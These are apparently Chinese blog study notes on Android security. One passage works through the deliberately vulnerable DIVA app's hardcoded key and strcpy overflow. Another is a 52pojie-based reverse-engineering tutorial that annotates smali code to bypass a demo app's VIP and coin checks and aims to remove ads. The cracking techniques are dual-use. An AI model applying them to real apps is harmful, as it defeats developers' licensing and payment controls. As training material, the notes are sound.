class="comment">// layout:activity_hardcode2</span></span><br><span class="line">        <span class="built_in">this</span>.djni = <span class="keyword">new</span> <span class="title class_">DivaJni</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>djni</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DivaJni</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">soName</span> <span class="operator">=</span> <span class="string">&quot;divajni&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;divajni&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">access</span><span class="params">(String arg1)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">initiateLaunchSequence</span><span class="params">(String arg1)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>System.loadLibrary(“divajni”)加载了divajni库，一般库文件都放在&#x2F;lib下，在目录下找到libdivajni.so文件，linux下可以使用strings方便的查看二进制文件里的字符串。</p>
<p>olsdfgad;lh</p>
<h2 id="输入校验问题—第三部分"><a href="#输入校验问题—第三部分" class="headerlink" title="输入校验问题—第三部分"></a>输入校验问题—第三部分</h2><p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InputValidation3Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> DivaJni djni;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040022</span>);  <span class="comment">// layout:activity_input_validation3</span></span><br><span class="line">        <span class="built_in">this</span>.djni = <span class="keyword">new</span> <span class="title class_">DivaJni</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">cTxt</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0085</span>);  <span class="comment">// id:ivi3CodeText</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.djni.initiateLaunchSequence(cTxt.getText().toString()) != <span class="number">0</span>) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Launching in T - 10 ...&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Access denied!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>djni</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DivaJni</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">soName</span> <span class="operator">=</span> <span class="string">&quot;divajni&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;divajni&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">access</span><span class="params">(String arg1)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">initiateLaunchSequence</span><span class="params">(String arg1)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当输入超级多的数据时，程序崩溃了</p>
<p>查看logcat可以发现缓冲区溢出了</p>
<p>可以看到这里使用的是strcpy，使用strcpy_s更加安全</p>
<h2 id="drozer"><a href="#drozer" class="headerlink" title="drozer"></a>drozer</h2><p><a href="https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf">mwri (withsecure.com)</a></p>
<p><a href="https://blog.csdn.net/jianglianye21/article/details/80667346">drozer-Android安全测试基本使用教程（Windows10）_drozer官网_一世繁华行的博客-CSDN博客</a></p>
<p><a href="https://www.jianshu.com/p/dfa92bab3a55">Android安全测试框架Drozer（使用篇） - 简书 (jianshu.com)</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>知道怎么配ADB、以及安卓有哪些漏洞有了更深的了解、以及安卓信息保存、处理输入逻辑等有了更深的了解。</p>
<p>以后有需要再继续深入学习安卓。</p>
]]></content>
      <tags>
        <tag>安全</tag>
        <tag>安卓</tag>
      </tags>
  </entry>
  <entry>
    <title>android_study_吴爱破解</title>
    <url>/2023/03/18/android-study/</url>
    <content><![CDATA[<p><a href="https://www.52pojie.cn/thread-648530-1-1.html">《教我兄弟学Android逆向01 编写第一个Android程序》 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p><a href="https://www.52pojie.cn/thread-1695141-1-1.html">https://www.52pojie.cn/thread-1695141-1-1.html</a></p>
<p><a href="https://www.runoob.com/w3cnote/android-tutorial-intro.html">1.0 Android基础入门教程 | 菜鸟教程 (runoob.com)</a></p>
<span id="more"></span>

<h2 id="模拟器环境搭建"><a href="#模拟器环境搭建" class="headerlink" title="模拟器环境搭建"></a>模拟器环境搭建</h2><h3 id="什么是安卓逆向？"><a href="#什么是安卓逆向？" class="headerlink" title="什么是安卓逆向？"></a>什么是安卓逆向？</h3><p>安卓逆向是对已经打包好的APP进行反编译、源码分析了解APP实现逻辑的一门技术</p>
<h3 id="安卓逆向可以干嘛？"><a href="#安卓逆向可以干嘛？" class="headerlink" title="安卓逆向可以干嘛？"></a>安卓逆向可以干嘛？</h3><p>去更新<br>去广告<br>内购&#x2F;会员破解<br>协议自动签到<br>白嫖！！！</p>
<h3 id="Magisk介绍"><a href="#Magisk介绍" class="headerlink" title="Magisk介绍"></a>Magisk介绍</h3><p>参考链接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://sspai.com/post/67932</span><br><span class="line">https://magiskcn.com/</span><br><span class="line">https://www.52pojie.cn/thread-1583586-1-1.html</span><br><span class="line">https://magiskcn.com/lsposed-instal</span><br></pre></td></tr></table></figure>

<p>Magisk 是一套用于定制 Android 的开源软件，支持高于 Android 5.0 的设备。</p>
<p>以下是一些功能亮点：</p>
<ul>
<li><strong>MagiskSU</strong>：为应用程序提供 root 访问权限</li>
<li><strong>Magisk 模块</strong>：通过安装模块修改只读分区</li>
<li><strong>MagiskHide</strong>：从根检测 &#x2F; 系统完整性检查中隐藏 Magisk(Shamiko)</li>
<li><strong>MagiskBoot</strong> : 最完整的安卓启动镜像解包和重新打包工具</li>
</ul>
<h3 id="学习环境搭建"><a href="#学习环境搭建" class="headerlink" title="学习环境搭建"></a>学习环境搭建</h3><ul>
<li>下载雷电模拟器，开启root权限以及System.vmdk可写入</li>
<li>拖进面具安装，安装至系统分区，出现ALL DONE安装成功</li>
<li>安装lsposed模块</li>
</ul>
<h2 id="APK文件结构、双开、汉化、基础修改"><a href="#APK文件结构、双开、汉化、基础修改" class="headerlink" title="APK文件结构、双开、汉化、基础修改"></a>APK文件结构、双开、汉化、基础修改</h2><p>工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">教程Demo</span><br><span class="line">MT管理器/NP管理器</span><br><span class="line">开发者助手</span><br><span class="line">雷电模拟器</span><br><span class="line">核心破解器（可以按照相同包名不同签名</span><br></pre></td></tr></table></figure>

<h3 id="Apk结构"><a href="#Apk结构" class="headerlink" title="Apk结构"></a>Apk结构</h3><p>apk 全称 Android Package，它相当于一个压缩文件，只要在电脑上将apk后缀改为zip即可解压。</p>
<p>解压后：</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230318203435733.png" alt="image-20230318203435733" style="zoom:25%;" />



<table>
<thead>
<tr>
<th align="center">文件</th>
<th align="center">注释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">assets目录</td>
<td align="center">存放APK的静态资源文件，比如视频，音频，图片等</td>
</tr>
<tr>
<td align="center">lib 目录</td>
<td align="center">armeabi-v7a基本通用所有android设备，arm64-v8a只适用于64位的android设备，x86常见用于android模拟器，其目录下的.so文件是c或c++编译的动态链接库文件</td>
</tr>
<tr>
<td align="center">META-INF目录</td>
<td align="center">保存应用的签名信息，签名信息可以验证APK文件的完整性，相当于APK的身份证(验证文件是否又被修改)</td>
</tr>
<tr>
<td align="center">res目录</td>
<td align="center">res目录存放资源文件，包括图片，字符串等等，APK的脸蛋由他的layout文件设计</td>
</tr>
<tr>
<td align="center">AndroidMainfest.xml文件</td>
<td align="center">APK的应用清单信息，它描述了应用的名字，版本，权限，引用的库文件等等信息</td>
</tr>
<tr>
<td align="center">classes.dex文件</td>
<td align="center">classes.dex是java源码编译后生成的java字节码文件，APK运行的主要逻辑</td>
</tr>
<tr>
<td align="center">resources.arsc文件</td>
<td align="center">resources.arsc是编译后的二进制资源文件，它是一个映射表，映射着资源和id，通过R文件中的id就可以找到对应的资源</td>
</tr>
</tbody></table>
<h3 id="双开及原理"><a href="#双开及原理" class="headerlink" title="双开及原理"></a>双开及原理</h3><p>双开：简单来说，就是手机同时运行两个或多个相同的应用</p>
<p>可以直接使用MT管理器修改包名</p>
<table>
<thead>
<tr>
<th align="center">原理</th>
<th align="center">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">修改包名</td>
<td align="center">让手机系统认为这是2个APP，这样的话就能生成2个数据存储路径，此时的多开就等于你打开了两个互不干扰的APP</td>
</tr>
<tr>
<td align="center">修改Framework</td>
<td align="center">对于有系统修改权限的厂商，可以修改Framework来实现双开的目的，例如：小米自带多开</td>
</tr>
<tr>
<td align="center">通过虚拟化技术实现</td>
<td align="center">虚拟Framework层、虚拟文件系统、模拟Android对组件的管理、虚拟应用进程管理 等一整套虚拟技术，将APK复制一份到虚拟空间中运行，例如：平行空间</td>
</tr>
<tr>
<td align="center">以插件机制运行</td>
<td align="center">利用反射替换，动态代{过}{滤}理，hook了系统的大部分与system—server进程通讯的函数，以此作为“欺上瞒下”的目的，欺骗系统“以为”只有一个apk在运行，瞒过插件让其“认为”自己已经安装。例如：VirtualApp</td>
</tr>
</tbody></table>
<h3 id="汉化APK"><a href="#汉化APK" class="headerlink" title="汉化APK"></a>汉化APK</h3><p>汉化：使用专门的工具对外文版的软件资源进行读取、翻译、修改、回写等一系列处理，使软件的菜单、对话框、提示等用户界面显示为中文，而程序的内核和功能保持不变，这个过程即为软件汉化</p>
<h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">定义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">versionCode</td>
<td align="center">版本号，主要用来更新，例如:12</td>
</tr>
<tr>
<td align="center">versionName</td>
<td align="center">版本名，给用户看的，例如:1.2</td>
</tr>
<tr>
<td align="center">package</td>
<td align="center">包名，例如：com.zj.52pj.demo</td>
</tr>
<tr>
<td align="center">uses-permission android:name&#x3D;””</td>
<td align="center">应用权限，例如：android.permission.INTERNET 代表网络权限</td>
</tr>
<tr>
<td align="center">android:label&#x3D;”@string&#x2F;app_name”</td>
<td align="center">应用名称</td>
</tr>
<tr>
<td align="center">android:icon&#x3D;”@mipmap&#x2F;ic_launcher”</td>
<td align="center">应用图标路径</td>
</tr>
<tr>
<td align="center">android:debuggable&#x3D;”true”</td>
<td align="center">应用是否开启debug权限</td>
</tr>
</tbody></table>
<h3 id="eg"><a href="#eg" class="headerlink" title="eg:"></a>eg:</h3><p><a href="https://www.bilibili.com/video/BV1UV411i7sG/">超详细MT管理器改包教程：教你修改包名、名称、版本、图标_哔哩哔哩_bilibili</a></p>
<p>应用双开</p>
<p>修改名字:<a href="https://www.cnblogs.com/wxy13644813114/p/13608281.html">转载-mt管理器修改软件名称（第二课） - 王啸岩 - 博客园 (cnblogs.com)</a></p>
<p>找个英文应用汉化</p>
<p>替换应用的图片：在res中找文件</p>
<h2 id="初识smali，vip终结者"><a href="#初识smali，vip终结者" class="headerlink" title="初识smali，vip终结者"></a>初识smali，vip终结者</h2><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>了解JVM、Dalvik、ART<br>初识smali语法<br>实战修改smali</p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>教程Demo(更新)<br>MT管理器&#x2F;NP管理器<br>雷电模拟器<br>jadx-gui（开源反编译工具<br>核心破解（解决签名问题</p>
<p>smail语法查询</p>
<h3 id="JVM、Dalvik、ART"><a href="#JVM、Dalvik、ART" class="headerlink" title="JVM、Dalvik、ART"></a>JVM、Dalvik、ART</h3><p>JVM是JAVA虚拟机，运行JAVA字节码程序<br>Dalvik是Google专门为Android设计的一个虚拟机，Dalvik有专属的文件执行格式dex(Dalvik executable)<br>Art(Android Runtime)相当于Dalvik的升级版，本质与Dalvik无异</p>
<h3 id="smali及其语法"><a href="#smali及其语法" class="headerlink" title="smali及其语法"></a>smali及其语法</h3><p>参考：</p>
<p><a href="https://blog.csdn.net/lixpjita39/article/details/75193833">Android逆向世界之一:smali文件_smail_逆风Lee的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/l_o_s/article/details/79305253">Smali基本语法(一)_smali注释_岳锋的博客-CSDN博客</a></p>
<p><a href="https://www.chieng.cn/post/169.html">smali语法详解（逆向安卓必学）_文摘_Chieng个人博客</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/379336005">Smali基本语法与指令 - 知乎 (zhihu.com)</a></p>
<p><a href="https://blog.csdn.net/Rozol/article/details/88368358">https://blog.csdn.net/Rozol/article/details/88368358</a></p>
<h4 id="smali文件的结构"><a href="#smali文件的结构" class="headerlink" title="smali文件的结构"></a>smali文件的结构</h4><h5 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">.class &lt;访问权限修饰符&gt; [非权限修饰符] &lt;类名&gt;</span><br><span class="line">.<span class="built_in">super</span> &lt;父类名&gt;</span><br><span class="line">.source &lt;源文件名称&gt;</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.class public final Llutey/FTPServer/preferences/PreferencesFactory;</span><br><span class="line">.super Ljava/lang/Object;</span><br><span class="line">.source &quot;PreferencesFactory.java&quot;</span><br></pre></td></tr></table></figure>

<h5 id="接口实现"><a href="#接口实现" class="headerlink" title="接口实现"></a>接口实现</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#interfaces</span><br><span class="line">.implements &lt;接口名称&gt;</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># interfaces</span><br><span class="line">.implements Landroid/view/View$OnClickListener;</span><br></pre></td></tr></table></figure>

<h5 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#annotations</span><br><span class="line">.annotation [注解的属性] &lt;注解类名&gt;</span><br><span class="line">    [注解字段=值]</span><br><span class="line">    ...</span><br><span class="line">.end annotation</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># annotations</span><br><span class="line">.annotation build Landroid/annotation/TargetApi;</span><br><span class="line">    value = 0xb</span><br><span class="line">.end annotation</span><br></pre></td></tr></table></figure>

<h5 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h5><p>使用.field描述字段的定义，分为静态变量和普通变量两种：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#static fields</span><br><span class="line">.field &lt;访问权限&gt; static [修饰词] &lt;字段名&gt;:&lt;变量类型&gt;</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># static fields</span><br><span class="line">.field public static mStr:Ljava/lang/String;</span><br></pre></td></tr></table></figure>



<h4 id="常用指令1"><a href="#常用指令1" class="headerlink" title="常用指令1"></a>常用指令1</h4><table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">注释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">.class</td>
<td align="center">类名</td>
</tr>
<tr>
<td align="center">.super</td>
<td align="center">父类名，继承的上级类名名称</td>
</tr>
<tr>
<td align="center">.source</td>
<td align="center">源名</td>
</tr>
<tr>
<td align="center">.field</td>
<td align="center">变量</td>
</tr>
<tr>
<td align="center">.method</td>
<td align="center">方法名</td>
</tr>
<tr>
<td align="center">.register</td>
<td align="center">寄存器</td>
</tr>
<tr>
<td align="center">.end method</td>
<td align="center">方法名的结束</td>
</tr>
<tr>
<td align="center">public</td>
<td align="center">公有</td>
</tr>
<tr>
<td align="center">protected</td>
<td align="center">半公开，只有同一家人才能用</td>
</tr>
<tr>
<td align="center">private</td>
<td align="center">私有，只能自己使用</td>
</tr>
<tr>
<td align="center">.parameter</td>
<td align="center">方法参数</td>
</tr>
<tr>
<td align="center">.prologue</td>
<td align="center">方法开始</td>
</tr>
<tr>
<td align="center">.line xxx</td>
<td align="center">位于第xxx行</td>
</tr>
<tr>
<td align="center">.annotation&#x2F;.end annotation</td>
<td align="center"></td>
</tr>
</tbody></table>
<h4 id="数据类型对应"><a href="#数据类型对应" class="headerlink" title="数据类型对应"></a>数据类型对应</h4><table>
<thead>
<tr>
<th align="center">smali类型</th>
<th align="center">java类型</th>
<th align="center">注释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">V</td>
<td align="center">void</td>
<td align="center">无返回值</td>
</tr>
<tr>
<td align="center">Z</td>
<td align="center">boolean</td>
<td align="center">布尔值类型，返回0或1</td>
</tr>
<tr>
<td align="center">B</td>
<td align="center">byte</td>
<td align="center">字节类型，返回字节</td>
</tr>
<tr>
<td align="center">S</td>
<td align="center">short</td>
<td align="center">短整数类型，返回数字</td>
</tr>
<tr>
<td align="center">C</td>
<td align="center">char</td>
<td align="center">字符类型，返回字符</td>
</tr>
<tr>
<td align="center">I</td>
<td align="center">int</td>
<td align="center">整数类型，返回数字</td>
</tr>
<tr>
<td align="center">J</td>
<td align="center">long （64位 需要2个寄存器存储）</td>
<td align="center">长整数类型，返回数字</td>
</tr>
<tr>
<td align="center">F</td>
<td align="center">float</td>
<td align="center">单浮点类型，返回数字</td>
</tr>
<tr>
<td align="center">D</td>
<td align="center">double （64位 需要2个寄存器存储）</td>
<td align="center">双浮点类型，返回数字</td>
</tr>
<tr>
<td align="center">string</td>
<td align="center">String</td>
<td align="center">文本类型，返回字符串</td>
</tr>
<tr>
<td align="center">Lxxx&#x2F;xxx&#x2F;xxx</td>
<td align="center">object</td>
<td align="center">对象类型，返回对象</td>
</tr>
</tbody></table>
<h4 id="常用指令2"><a href="#常用指令2" class="headerlink" title="常用指令2"></a>常用指令2</h4><table>
<thead>
<tr>
<th align="center">关键字</th>
<th align="center">注释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">const</td>
<td align="center">重写整数属性，真假属性内容，只能是数字类型</td>
</tr>
<tr>
<td align="center">const-string</td>
<td align="center">重写字符串内容</td>
</tr>
<tr>
<td align="center">const-wide</td>
<td align="center">重写长整数类型，多用于修改到期时间。</td>
</tr>
<tr>
<td align="center">return</td>
<td align="center">返回指令</td>
</tr>
<tr>
<td align="center">if-eq</td>
<td align="center">全称equal(a&#x3D;b)，比较寄存器ab内容，相同则跳</td>
</tr>
<tr>
<td align="center">if-ne</td>
<td align="center">全称not equal(a!&#x3D;b)，ab内容不相同则跳</td>
</tr>
<tr>
<td align="center">if-eqz</td>
<td align="center">全称equal zero(a&#x3D;0)，z即是0的标记，a等于0则跳</td>
</tr>
<tr>
<td align="center">if-nez</td>
<td align="center">全称not equal zero(a!&#x3D;0)，a不等于0则跳</td>
</tr>
<tr>
<td align="center">if-ge</td>
<td align="center">全称greater equal(a&gt;&#x3D;b)，a大于或等于则跳</td>
</tr>
<tr>
<td align="center">if-le</td>
<td align="center">全称little equal(a&lt;&#x3D;b)，a小于或等于则跳</td>
</tr>
<tr>
<td align="center">goto</td>
<td align="center">强制跳到指定位置</td>
</tr>
<tr>
<td align="center">switch</td>
<td align="center">分支跳转，一般会有多个分支线，并根据指令跳转到适当位置</td>
</tr>
<tr>
<td align="center">iget</td>
<td align="center">获取寄存器数据</td>
</tr>
</tbody></table>
<h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器:"></a>寄存器:</h4><p>在smali里的所有操作都必须经过寄存器来进行:本地寄存器用v开头数字结尾的符号来表示，如v0、 v1、v2。 参数寄存器则使用p开头数字结尾的符号来表示，如p0、p1、p2。特别注意的是，p0不一定是函数中的第一个参数，在非static函数中，p0代指“this”，p1表示函数的第一个 参数，p2代表函数中的第二个参数。而在static函数中p0才对应第一个参数(因为Java的static方法中没有this方法）</p>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>本次学习使用的demo为修改一app使其能够一来就有大会员。</p>
<h4 id="jadx-gui寻找目标位置"><a href="#jadx-gui寻找目标位置" class="headerlink" title="jadx-gui寻找目标位置"></a>jadx-gui寻找目标位置</h4><p>打开文件</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230319110933178.png" alt="image-20230319110933178" style="zoom:67%;" />

<p>jadx-gui搜索关键字符串：大会员</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230319111126434.png" alt="image-20230319111126434" style="zoom:50%;" />

<p>找到对应位置了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//一个私有、静态、不可变的方法   方法名</span><br><span class="line">.method private static final onCreate$lambda-2(Lkotlin/jvm/internal/Ref$IntRef;Lcom/zj/wuaipojie/ui/ChallengeSecond;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/view/View;)Z //(这里面是方法的参数)这里是方法返回值类型，表示布尔值类型，返回假或真</span><br><span class="line">    .registers 7  //寄存器数量</span><br><span class="line"></span><br><span class="line">    .line 33  //代码所在的行数</span><br><span class="line">    iget p0, p0, Lkotlin/jvm/internal/Ref$IntRef;-&gt;element:I  //读取p0(第一个参数，参考寄存器知识)中element的值赋值给p0</span><br><span class="line"></span><br><span class="line">    const/4 p5, 0x1  //p5赋值1</span><br><span class="line"></span><br><span class="line">    const/16 v0, 0xa //v0赋值10，在16进制里a表示10</span><br><span class="line"></span><br><span class="line">    if-ge p0, v0, :cond_15  //判断p0的值是否大于或等于v0的值(即p0的值是否大于或等于10)，如果大于或等于则跳转到:cond_15</span><br><span class="line"></span><br><span class="line">    .line 34  //以下是常见的Toast弹窗代码</span><br><span class="line">    check-cast p1, Landroid/content/Context; //检查Context对象引用</span><br><span class="line"></span><br><span class="line">    const-string p0, &quot;请先获取10个硬币哦&quot; //弹窗文本信息，把&quot;&quot;里的字符串数据赋值给p0</span><br><span class="line"></span><br><span class="line">    check-cast p0, Ljava/lang/CharSequence; //检查CharSequence对象引用</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast; </span><br><span class="line">    //将弹窗文本、显示时间等信息传给p1</span><br><span class="line"></span><br><span class="line">    move-result-object p0  //结果传递给p0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V  //当看到这个Toast;-&gt;show你就应该反应过来这里是弹窗代码</span><br><span class="line"></span><br><span class="line">    goto :goto_31  //跳转到:goto_31</span><br><span class="line"></span><br><span class="line">    :cond_15 //跳转的一个地址</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p1&#125;, Lcom/zj/wuaipojie/ui/ChallengeSecond;-&gt;isvip()Z  //判断isvip方法的返回值是否为真(即结果是否为1)</span><br><span class="line"></span><br><span class="line">    move-result p0  //结果赋值给p0</span><br><span class="line"></span><br><span class="line">    if-eqz p0, :cond_43 //如果结果为0则跳转cond_43地址</span><br><span class="line"></span><br><span class="line">    const p0, 0x7f0d0018  //在arsc中的id索引，这个值可以进行查询</span><br><span class="line"></span><br><span class="line">    .line 37</span><br><span class="line">    invoke-virtual &#123;p2, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V //设置图片资源</span><br><span class="line"></span><br><span class="line">    const p0, 0x7f0d0008</span><br><span class="line"></span><br><span class="line">    .line 38</span><br><span class="line">    invoke-virtual &#123;p3, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">    const p0, 0x7f0d000a</span><br><span class="line"></span><br><span class="line">    .line 39</span><br><span class="line">    invoke-virtual &#123;p4, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">    .line 40</span><br><span class="line">    sget-object p0, Lcom/zj/wuaipojie/util/SPUtils;-&gt;INSTANCE:Lcom/zj/wuaipojie/util/SPUtils; </span><br><span class="line"></span><br><span class="line">    check-cast p1, Landroid/content/Context;</span><br><span class="line"></span><br><span class="line">    const/4 p2, 0x2 //p2赋值2</span><br><span class="line"></span><br><span class="line">    const-string p3, &quot;level&quot; //sp的索引</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0, p1, p3, p2&#125;, Lcom/zj/wuaipojie/util/SPUtils;-&gt;saveInt(Landroid/content/Context;Ljava/lang/String;I)V //写入数据</span><br><span class="line"></span><br><span class="line">    goto :goto_50 //跳转地址</span><br><span class="line"></span><br><span class="line">    :cond_43</span><br><span class="line"></span><br><span class="line">    check-cast p1, Landroid/content/Context;</span><br><span class="line"></span><br><span class="line">    const-string p0, &quot;\u8bf7\u5148\u5145\u503c\u5927\u4f1a\u5458\u54e6\uff01&quot; //请先充值大会员哦！</span><br><span class="line"></span><br><span class="line">    check-cast p0, Ljava/lang/CharSequence;</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class="line"></span><br><span class="line">    move-result-object p0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class="line"></span><br><span class="line">    :goto_50</span><br><span class="line">    return p5  //返回p5的值</span><br><span class="line">.end method //方法结束</span><br><span class="line"></span><br><span class="line">//判断是否是大会员的方法</span><br><span class="line">.method public final isvip()Z</span><br><span class="line">    .registers 2</span><br><span class="line"></span><br><span class="line">    const/4 v0, 0x0 //v0赋值0</span><br><span class="line"></span><br><span class="line">    return v0 //返回v0的值</span><br><span class="line"></span><br><span class="line">.end method</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>主要有两个判断一个硬币判断一个大会员判断，直接改就是了</p>
<p>修改方法：修改判断、强制跳转、修改寄存器的值</p>
<h2 id="恭喜你获得广告-amp-弹窗静默卡"><a href="#恭喜你获得广告-amp-弹窗静默卡" class="headerlink" title="恭喜你获得广告&amp;弹窗静默卡"></a>恭喜你获得广告&amp;弹窗静默卡</h2><h3 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h3><p>1.了解安卓四大组件、Activity生命周期<br>2.弹窗定位、去更新<br>3.广告分析与布局优化</p>
<h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3><p>1.教程Demo(更新)<br>2.MT管理器&#x2F;NP管理器:activity记录<br>3.算法助手：hook弹窗<br>4.雷电模拟器<br>5.开发助手</p>
<h3 id="广告类型"><a href="#广告类型" class="headerlink" title="广告类型"></a>广告类型</h3><p>启动广告   弹窗&amp;更新广告  横幅广告</p>
<h3 id="安卓四大组件"><a href="#安卓四大组件" class="headerlink" title="安卓四大组件"></a>安卓四大组件</h3><table>
<thead>
<tr>
<th align="center">组件</th>
<th align="center">描述</th>
</tr>
</thead>
